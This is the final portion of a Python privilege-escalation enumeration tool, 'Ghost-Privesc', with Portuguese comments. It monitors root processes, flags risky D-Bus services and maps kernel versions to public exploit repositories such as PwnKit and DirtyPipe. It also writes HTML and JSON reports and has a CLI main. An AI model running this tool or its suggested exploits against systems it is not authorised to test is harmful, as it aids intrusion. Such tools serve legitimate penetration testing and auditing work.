            for linha in out.splitlines():
                pid = linha.strip().split()[0] if linha.strip() else ""
                if pid not in visto:
                    visto.add(pid)
                    partes = linha.split(None, 2)
                    if len(partes) >= 3 and partes[1] == "root" and pid not in ["1", "2"]:
                        cmd = partes[2][:100]
                        _p("ALERTA", f"Novo processo root: PID={pid} CMD={cmd}")
        time.sleep(1)
    _p("INFO", f"Monitoramento concluido. {len(visto)} processos totais observados")


# ─────────────────────────────────────────────────────────────────
# D-Bus Enumeration
# ─────────────────────────────────────────────────────────────────

def verificar_dbus():
    """Enumera servicos D-Bus e verifica interfaces perigosas."""
    _p("TITULO", "D-BUS ENUMERATION")
    out, _ = _run("busctl list 2>/dev/null || dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null", timeout=8)
    if not out or not out.strip():
        _p("INFO", "D-Bus nao acessivel ou dbus-send/busctl nao encontrado")
        return
    perigosos = ["org.freedesktop.PolicyKit1", "org.freedesktop.NetworkManager",
                 "com.ubuntu.SystemService", "org.freedesktop.systemd1",
                 "org.freedesktop.Packagekit"]
    linhas = out.splitlines()
    _p("INFO", f"{len(linhas)} servicos D-Bus encontrados")
    for srv in perigosos:
        if any(srv in l for l in linhas):
            _p("MEDIO", f"Servico D-Bus potencialmente abusavel: {srv}",
               "Verificar metodos expostos com busctl introspect")


# ─────────────────────────────────────────────────────────────────
# Exploit Suggestions (kernel CVE links)
# ─────────────────────────────────────────────────────────────────

_EXPLOIT_DB = {
    "3.": [
        ("CVE-2016-5195", "DirtyCow",   "https://github.com/dirtycow/dirtycow.github.io"),
        ("CVE-2017-16995","eBPF UAF",   "https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack"),
    ],
    "4.": [
        ("CVE-2016-5195", "DirtyCow",   "https://github.com/dirtycow/dirtycow.github.io"),
        ("CVE-2021-3156", "Sudo Heap",  "https://github.com/blasty/CVE-2021-3156"),
        ("CVE-2021-4034", "PwnKit",     "https://github.com/berdav/CVE-2021-4034"),
    ],
    "5.": [
        ("CVE-2021-3156", "Sudo Heap",  "https://github.com/blasty/CVE-2021-3156"),
        ("CVE-2021-4034", "PwnKit",     "https://github.com/berdav/CVE-2021-4034"),
        ("CVE-2022-0847", "DirtyPipe",  "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
        ("CVE-2022-25636","Netfilter",  "https://github.com/Bonfee/CVE-2022-25636"),
        ("CVE-2022-32250","nftables UAF","https://github.com/theori-io/CVE-2022-32250-exploit"),
        ("CVE-2023-0386", "OverlayFS",  "https://github.com/xkaneiki/CVE-2023-0386"),
        ("CVE-2023-32629","GameOver(lay)","https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629"),
    ],
    "6.": [
        ("CVE-2022-0847", "DirtyPipe",  "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
        ("CVE-2023-0386", "OverlayFS",  "https://github.com/xkaneiki/CVE-2023-0386"),
        ("CVE-2024-1086", "nf_tables UAF","https://github.com/notselwyn/CVE-2024-1086"),
    ],
}


def sugerir_exploits():
    """Sugere exploits publicos baseado na versao do kernel detectada."""
    _p("TITULO", "SUGESTAO DE EXPLOITS (kernel CVE)")
    out, _ = _run("uname -r")
    kernel = out.strip() if out else ""
    if not kernel:
        _p("INFO", "Nao foi possivel obter versao do kernel")
        return
    _p("INFO", f"Kernel: {kernel}")
    encontrados = 0
    for prefixo, exploits in _EXPLOIT_DB.items():
        if kernel.startswith(prefixo):
            for cve, nome, url in exploits:
                _p("ALERTA", f"{cve} ({nome}) pode ser aplicavel", f"PoC: {url}")
                encontrados += 1
    if not encontrados:
        _p("INFO", "Nenhum exploit conhecido na base para este kernel (verifique manualmente)")
    else:
        _p("INFO", f"{encontrados} exploit(s) sugerido(s) — CONFIRME se aplica antes de usar")


# ─────────────────────────────────────────────────────────────────
# HTML Report
# ─────────────────────────────────────────────────────────────────

def gerar_relatorio_html(saida_html):
    """Gera relatorio HTML com dark theme."""
    criticos = [a for a in _achados if a["nivel"] == "CRITICO"]
    altos    = [a for a in _achados if a["nivel"] == "ALTO"]
    medios   = [a for a in _achados if a["nivel"] == "MEDIO"]
    baixos   = [a for a in _achados if a["nivel"] == "BAIXO"]

    def _cor_html(nivel):
        return {"CRITICO": "#ff4444", "ALTO": "#ff8800",
                "MEDIO": "#ffcc00", "BAIXO": "#44bbff",
                "ALERTA": "#ff8800", "INFO": "#aaaaaa"}.get(nivel, "#ffffff")

    rows = ""
    for a in _achados:
        cor = _cor_html(a["nivel"])
        detalhe = (a.get("detalhe") or "").replace("<", "&lt;").replace(">", "&gt;")
        msg = a["msg"].replace("<", "&lt;").replace(">", "&gt;")
        rows += (f"<tr><td style='color:{cor};font-weight:bold'>{a['nivel']}</td>"
                 f"<td>{msg}</td><td style='color:#888;font-size:0.85em'>{detalhe}</td></tr>\n")

    html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Ghost-Privesc Report</title>
<style>
:root{{--bg:#0d0d0d;--card:#1a1a1a;--border:#2a2a2a;--text:#e0e0e0;--accent:#ff4444}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--text);font-family:monospace;font-size:14px;padding:2rem}}
h1{{color:var(--accent);margin-bottom:0.5rem}}
.meta{{color:#888;margin-bottom:2rem}}
.stats{{display:flex;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}}
.stat{{background:var(--card);border:1px solid var(--border);padding:1rem 1.5rem;border-radius:6px}}
.stat .n{{font-size:2rem;font-weight:bold}}
.critico{{color:#ff4444}}.alto{{color:#ff8800}}.medio{{color:#ffcc00}}.baixo{{color:#44bbff}}
table{{width:100%;border-collapse:collapse;background:var(--card)}}
th{{background:#111;padding:0.75rem;text-align:left;color:#888;border-bottom:1px solid var(--border)}}
td{{padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);vertical-align:top}}
tr:hover td{{background:#1f1f1f}}
</style>
</head>
<body>
<h1>Ghost-Privesc v2.0.0 — Privilege Escalation Report</h1>
<p class="meta">By Gh0st-Bx1 | github.com/Ghost-Bx1 | Score: <strong>{_score}</strong> pts</p>
<div class="stats">
  <div class="stat"><div class="n critico">{len(criticos)}</div><div>CRITICOS</div></div>
  <div class="stat"><div class="n alto">{len(altos)}</div><div>ALTOS</div></div>
  <div class="stat"><div class="n medio">{len(medios)}</div><div>MEDIOS</div></div>
  <div class="stat"><div class="n baixo">{len(baixos)}</div><div>BAIXOS</div></div>
</div>
<table>
<thead><tr><th>Nivel</th><th>Achado</th><th>Detalhe</th></tr></thead>
<tbody>
{rows}
</tbody>
</table>
</body>
</html>"""

    try:
        with open(saida_html, "w", encoding="utf-8") as f:
            f.write(html)
        _p("INFO", f"Relatorio HTML salvo: {saida_html}")
    except Exception as e:
        _p("INFO", f"Erro ao salvar HTML: {e}")


# ─────────────────────────────────────────────────────────────────
# Relatorio
# ─────────────────────────────────────────────────────────────────

def gerar_relatorio(saida_json=None):
    global _score

    criticos = [a for a in _achados if a["nivel"] == "CRITICO"]
    altos = [a for a in _achados if a["nivel"] == "ALTO"]
    medios = [a for a in _achados if a["nivel"] == "MEDIO"]

    print(f"\n  {C['B']}{C['BOLD']}[=] RESUMO{C['X']}")
    print(f"  {C['DIM']}{'─' * 60}{C['X']}")
    print(f"  {C['R']}{C['BOLD']}CRITICOS: {len(criticos)}{C['X']}  "
          f"{C['R']}ALTOS: {len(altos)}{C['X']}  "
          f"{C['Y']}MEDIOS: {len(medios)}{C['X']}")
    print(f"  Score de risco: {C['BOLD']}{_score}{C['X']} pontos")

    if _score >= 20:
        print(f"\n  {C['R']}{C['BOLD']}[!] RISCO CRITICO — Multiplos vetores de privesc identificados{C['X']}")
    elif _score >= 10:
        print(f"\n  {C['R']}[!] RISCO ALTO — Vetores de privesc identificados{C['X']}")
    elif _score >= 5:
        print(f"\n  {C['Y']}[!] RISCO MEDIO — Possibilidades de privesc encontradas{C['X']}")
    else:
        print(f"\n  {C['G']}[+] RISCO BAIXO — Poucos vetores encontrados (verificar manualmente){C['X']}")

    if saida_json:
        dados = {
            "meta": {
                "ferramenta": "Ghost-Privesc v2.0.0",
                "autor": "Gh0st-Bx1",
                "github": "github.com/Ghost-Bx1",
                "data": datetime.now().isoformat(),
                "score": _score,
            },
            "resumo": {
                "criticos": len(criticos),
                "altos": len(altos),
                "medios": len(medios),
            },
            "achados": _achados,
        }
        try:
            with open(saida_json, "w", encoding="utf-8") as f:
                json.dump(dados, f, ensure_ascii=False, indent=2)
            print(f"\n  {C['G']}[+] Relatorio salvo: {saida_json}{C['X']}")
        except Exception as e:
            print(f"\n  {C['R']}[!] Erro ao salvar relatorio: {e}{C['X']}")


# ─────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────

def main():
    is_windows = sys.platform == "win32"

    print(BANNER)

    p = argparse.ArgumentParser(
        prog="ghost-privesc",
        description="Ghost-Privesc v2.0.0 — Linux & Windows Privilege Escalation Checker | By Gh0st-Bx1",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("--completo", action="store_true", help="Executar todos os modulos")
    p.add_argument("--sistema", action="store_true", help="Informacoes do sistema (Linux)")
    p.add_argument("--kernel", action="store_true", help="Verificar CVEs de kernel (Linux)")
    p.add_argument("--sudo", action="store_true", help="Analisar sudo -l (Linux)")
    p.add_argument("--suid", action="store_true", help="Buscar binarios SUID/SGID (Linux)")
    p.add_argument("--caps", action="store_true", help="Verificar capabilities (Linux)")
    p.add_argument("--cron", action="store_true", help="Analisar cron jobs (Linux)")
    p.add_argument("--servicos", action="store_true", help="Verificar unit files gravieis (Linux)")
    p.add_argument("--path", action="store_true", help="PATH hijacking")
    p.add_argument("--nfs", action="store_true", help="NFS no_root_squash (Linux)")
    p.add_argument("--senhas", action="store_true", help="Credenciais em arquivos")
    p.add_argument("--containers", action="store_true", help="Docker/LXD escape (Linux)")
    p.add_argument("--graveis", action="store_true", help="Arquivos criticos gravieis")
    p.add_argument("--env", action="store_true", help="Variaveis de ambiente suspeitas")
    p.add_argument("--processos", action="store_true", help="Processos rodando como root")
    p.add_argument("--portas", action="store_true", help="Portas internas/localhost")
    p.add_argument("--usuarios", action="store_true", help="Usuarios e UIDs suspeitos")
    # Novos modulos v2.0
    p.add_argument("--windows", action="store_true",
                   help="Verificacoes especificas para Windows (AlwaysInstallElevated, tokens, DLL)")
    p.add_argument("--pkexec", action="store_true",
                   help="CVE-2021-4034 PwnKit (pkexec) check")
    p.add_argument("--lib-hijack", dest="lib_hijack", action="store_true",
                   help="Shared library hijacking (LD_LIBRARY_PATH, SUID ldd)")
    p.add_argument("--sudo-token", dest="sudo_token", action="store_true",
                   help="Sudo token reuse via ptrace (sudo_inject)")
    p.add_argument("--monitor", action="store_true",
                   help="Monitorar novos processos por 15s (pspy-like)")
    p.add_argument("--dbus", action="store_true",
                   help="Enumerar servicos D-Bus perigosos")
    p.add_argument("--exploits", action="store_true",
                   help="Sugerir exploits publicos baseado no kernel")
    p.add_argument("--output", metavar="FILE", help="Salvar relatorio em JSON")
    p.add_argument("--html", metavar="FILE", help="Salvar relatorio em HTML (dark theme)")
    args = p.parse_args()

    novos_flags = [args.windows, args.pkexec, args.lib_hijack, args.sudo_token,
                   args.monitor, args.dbus, args.exploits]
    linux_flags = [args.sistema, args.kernel, args.sudo, args.suid, args.caps,
                   args.cron, args.servicos, args.path, args.nfs, args.senhas,
                   args.containers, args.graveis, args.env, args.processos,
                   args.portas, args.usuarios]
    executar_tudo = args.completo or not any(linux_flags + novos_flags)

    if is_windows:
        # No Windows, so linux checks sao pulados silenciosamente
        if executar_tudo or args.windows:
            verificar_windows()
    else:
        if executar_tudo or args.sistema:
            info_sistema()
        if executar_tudo or args.kernel:
            verificar_kernel()
        if executar_tudo or args.sudo:
            verificar_sudo()
        if executar_tudo or args.suid:
            verificar_suid()
        if executar_tudo or args.caps:
            verificar_capabilities()
        if executar_tudo or args.cron:
            verificar_cron()
        if executar_tudo or args.servicos:
            verificar_servicos()
        if executar_tudo or args.path:
            verificar_path()
        if executar_tudo or args.nfs:
            verificar_nfs()
        if executar_tudo or args.senhas:
            verificar_senhas()
        if executar_tudo or args.containers:
            verificar_containers()
        if executar_tudo or args.graveis:
            verificar_graveis()
        if executar_tudo or args.env:
            verificar_env()
        if executar_tudo or args.processos:
            verificar_processos()
        if executar_tudo or args.portas:
            verificar_portas_internas()
        if executar_tudo or args.usuarios:
            verificar_usuarios()
        if executar_tudo or args.pkexec:
            verificar_pkexec()
        if executar_tudo or args.lib_hijack:
            verificar_lib_hijacking()
        if executar_tudo or args.sudo_token:
            verificar_sudo_token()
        if executar_tudo or args.dbus:
            verificar_dbus()
        if executar_tudo or args.exploits:
            sugerir_exploits()
        if args.monitor:
            monitorar_processos()
        if args.windows:
            _p("INFO", "Flag --windows ignorado em Linux")

    gerar_relatorio(args.output)
    if hasattr(args, "html") and args.html:
        gerar_relatorio_html(args.html)
    print()


if __name__ == "__main__":
    main()
